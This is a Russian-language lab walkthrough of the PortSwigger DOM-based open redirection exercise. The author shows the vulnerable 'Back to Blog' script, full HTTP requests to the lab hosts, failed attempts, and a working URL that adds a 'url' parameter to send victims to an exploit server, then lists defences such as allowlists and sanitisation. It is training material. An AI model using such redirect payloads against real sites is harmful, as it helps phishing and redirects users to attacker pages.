##### DOM-based open redirection
лаба https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection

задание: перенаправить жертву на свой сайт (эксплойт сервер)

------


на странице поста есть кнопка "назад"

и вот код этой кнопки в html этой страницы

```html
<div class="is-linkback">
                        <a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
</div>
```

а вот сама ссылка при нажатии на кнопку  "назад" 
`GET / HTTP/2`


---


и еще есть вот запрос который оставляет коммент
```http
POST /post/comment HTTP/2
Host: 0a5300a80386fb7580c4172600ab000c.web-security-academy.net
Cookie: session=Fz7nbVIHlUoXMPF8FUQ92uCyaOMIwzsy
Content-Length: 102
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Origin: https://0a5300a80386fb7580c4172600ab000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5300a80386fb7580c4172600ab000c.web-security-academy.net/post?postId=2
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=nxMe6WLMKtpKP3SK8T2OisFJHPwABZjJ&postId=2&comment=123123&name=zheka&email=hacker%40bk.ru&website=
```

ответ на этот запрос
```http
HTTP/2 302 Found
Location: /post/comment/confirmation?postId=2
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

то есть происходит редирект на стр `GET /post/comment/confirmation?postId=2 ` где написано `Your comment has been submitted.
`
и тут ест кнопка 
```html
                   <div class="is-linkback">
                        <a href="/post?postId=2">Back to blog</a>
```


-------

заметил, что то что я отправляю в этом запросе
```http
GET /post/comment/confirmation?postId=2?postId=2 HTTP/2
Host: 0a5300a80386fb7580c4172600ab000c.web-security-academy.net
Cookie: session=Fz7nbVIHlUoXMPF8FUQ92uCyaOMIwzsy
Cache-Control: max-age=0
...
..
```

отражается в ответе стр в самом html
```html
                   <div class="is-linkback">
                        <a href="/post?postId=2?postId=2">Back to blog</a>
                    </div>
                </div>
```

и если нажать на кнопку "назад", после оставленного отзыва
то автоматом редиректит вот сюда
```http
GET /post?postId=2?postId=2 HTTP/2

ответ соответтвенно - HTTP/2 400 Bad Request
```

---

то есть по идее, можно как-то попробовать перенаправить на мой сервер, только вот проблема в том, что начало ссылки идет с GET /post?.... 

-----

сменю вектор

попробую воспользоваться этой уязвимость

```html
<div class="is-linkback">
   <a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
</div>
```
этот код берет из текущего URL страницы параметр `url` с помощью регулярки и делает на него редирект. Если параметра нет — редиректит на `/`

пробую
```http
GET /post?postId=7?url=https://python-academy.org/ru/guide HTTP/2
```
ответ 400, ничего удивительного

попробовал через пост - ответе 405

------

пробую
GET /post?postId=7#url=https://python-academy.org/ru/guide  - 400 Bad Request

пробую
GET /post?postId=7#url=python-academy.org/ru/guide HTTP/2  - 400 Bad Request

-------

пробую через &
```http
GET /post?postId=7&url=https://python-academy.org/ru/guide HTTP/2
```

вот урл 
```http
https://0a5300a80386fb7580c4172600ab000c.web-security-academy.net/post?postId=7&url=https://python-academy.org/ru/guide
```

получилось!!!!!!! ура!!
перешел на эту стр - нажал - "назад" - и попал на левый сайт (на курс обучения python)

-----

теперь подставлю туда ссылку на эксплойт сервер
вот так

```http
GET /post?postId=7&url=https://exploit-0aa600f303f8fb64801716fb0138002b.exploit-server.net/exploit HTTP/2
Host: 0a5300a80386fb7580c4172600ab000c.web-security-academy.net
Cookie: session=Fz7nbVIHlUoXMPF8FUQ92uCyaOMIwzsy
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5300a80386fb7580c4172600ab000c.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```
`https://0a5300a80386fb7580c4172600ab000c.web-security-academy.net/post?postId=7&url=https://exploit-0aa600f303f8fb64801716fb0138002b.exploit-server.net/exploit`

перешел на эту стр - нажал - "назад" - и попал на эксплойт сервер!!

--------
#### выводы

наше в html стр функцию - которая перенаправляют на нужную стр

нет валидации параметров ,которые я вписываю на url адрес, эти все параметры отражаются сервером

эта функция брала адрес из url запроса и подставляла в a href при клике, перенаправляя на адресс, что указан в самой 


#### защита

1. не добавлять излишний функционал в функции
2. везде где есть редиректы - редирект должен происходить через белые списки
3. должна быть всегда санитаризация/экранирование этих url
4. избегать использования `location.href` с данными, контролируемыми пользователем